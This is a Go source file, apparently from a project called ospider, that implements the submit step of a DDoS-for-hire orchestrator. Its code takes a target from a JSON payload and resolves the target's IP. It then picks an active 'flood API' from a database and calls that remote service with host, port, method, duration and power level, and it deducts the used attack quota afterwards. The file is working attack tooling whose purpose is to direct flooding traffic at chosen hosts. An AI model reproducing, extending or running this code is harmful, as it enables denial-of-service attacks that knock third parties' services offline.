package attack

import (
	"github.com/huzorro/ospider/common"
	"github.com/huzorro/ospider/web/handler" 
    "github.com/huzorro/ospider/util"
	"encoding/json"
    "sync"
    "net/url"
    "fmt"
    "github.com/PuerkitoBio/goquery"
    "encoding/binary"
)

type AttackSubmit struct {
    lock *sync.Mutex
    cfg common.Ospider                
}
func NewAttackSubmit(co common.Ospider) *AttackSubmit {
    return &AttackSubmit{cfg:co, lock:new(sync.Mutex)}
}

func (self *AttackSubmit) Process(payload string) {
    var (
        attack handler.FloodTarget
        api handler.FloodApi
        powerlevel uint32
        newPowerlevel uint32
        time uint32
        newTime uint32
    )
    self.cfg.Log.Println("attack submit...")
    if err := json.Unmarshal([]byte(payload), &attack); err != nil {
        self.cfg.Log.Printf("json Unmarshal fails %s", err)
        return
    }
    self.lock.Lock()
    defer self.lock.Unlock()
    // sqlStr := `select id, name, api, powerlevel, time 
    //             from spider_flood_api where uptime < unix_timestamp()  
    //             and time > 0 and powerlevel > 0 and status = 1`
    sqlStr := `select id, name, api, powerlevel, time 
                from spider_flood_api where uptime < unix_timestamp()  
                and status = 1`                
    stmtOut, err := self.cfg.Db.Prepare(sqlStr)
    defer stmtOut.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        return
    }  
    
     
    rows, err := stmtOut.Query()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        return        
    }
    for rows.Next() {
        err = rows.Scan(&api.Id, &api.Name, &api.Api, &api.Powerlevel, &api.Time)
        if err != nil {
            self.cfg.Log.Printf("rows.Scan (%s) fails %s", sqlStr, err)
            return             
        }
        var powerlevelBuf = make([]byte, 8)
        binary.BigEndian.PutUint64(powerlevelBuf, uint64(api.Powerlevel))
        powerlevel = binary.BigEndian.Uint32(powerlevelBuf[:4])
        newPowerlevel = binary.BigEndian.Uint32(powerlevelBuf[4:])
        
        var timeBuf = make([]byte, 8)
        binary.BigEndian.PutUint64(timeBuf, uint64(api.Time))
        time = binary.BigEndian.Uint32(timeBuf[:4])
        newTime = binary.BigEndian.Uint32(timeBuf[4:])
         
        if newPowerlevel > 0 && newTime > 0 {                        
             break;
        } 
    }
    self.cfg.Log.Printf("powerlevel:%d-%d time:%d-%d", powerlevel, newPowerlevel, time, newTime)    
    if newPowerlevel <= 0 || newTime <= 0 {
        return
    }
    //attack submit
    url, _ :=  url.ParseRequestURI(api.Api)
    query := url.Query()
    // ips, err := net.LookupIP(attack.Url)
    // if  err == nil {
    //     attack.Host = ips[0].String()
    // }
    ip, err := util.LookupHost(attack.Url)
    if err != nil {
        self.cfg.Log.Println("lookup host fails")        
    } else {
        attack.Host = ip
    }
    query.Add("host", attack.Host)
    query.Add("method", attack.Method)
    query.Add("time", fmt.Sprintf("%d", attack.Time))
    query.Add("port", attack.Port)
    query.Add("powerlevel", fmt.Sprintf("%d", attack.Powerlevel))
    url.RawQuery = query.Encode()
    
    self.cfg.Log.Println(url.String()) 
    response, err := util.HttpGet(url.String())
    defer func() {
        if response != nil {
            response.Body.Close()
        }
    }()
    if err != nil || response == nil {
        self.cfg.Log.Printf("request fails {%s}", url.String())
        return        
    }
    
    doc, _ := goquery.NewDocumentFromResponse(response)
    
    self.cfg.Log.Printf("{%s} {%s}", url.String(), doc.Text())
    
    sqlStr = `update spider_flood_api set time = ?, powerlevel = ? , uptime = unix_timestamp() + ? where id = ?`
    
    stmtIn, err := self.cfg.Db.Prepare(sqlStr)
    defer stmtIn.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        return
    } 
    var powerlevelBuf = make([]byte, 8)
    binary.BigEndian.PutUint32(powerlevelBuf[:4], powerlevel)
    binary.BigEndian.PutUint32(powerlevelBuf[4:], newPowerlevel - uint32(attack.Powerlevel)) 
    
    
    var timeBuf = make([]byte, 8)
    binary.BigEndian.PutUint32(timeBuf[:4], time)
    binary.BigEndian.PutUint32(timeBuf[4:], newTime - uint32(attack.Time))

    self.cfg.Log.Printf("powerlevel:%d-%d-%d time:%d-%d-%d", powerlevel, newPowerlevel, attack.Powerlevel, time, newTime,attack.Time)    
    _, err = stmtIn.Exec(binary.BigEndian.Uint64(timeBuf), binary.BigEndian.Uint64(powerlevelBuf), attack.Time, api.Id)
    
    if err != nil {
        self.cfg.Log.Printf("update flood api fails %s", err)
        return
    } 
                     
}
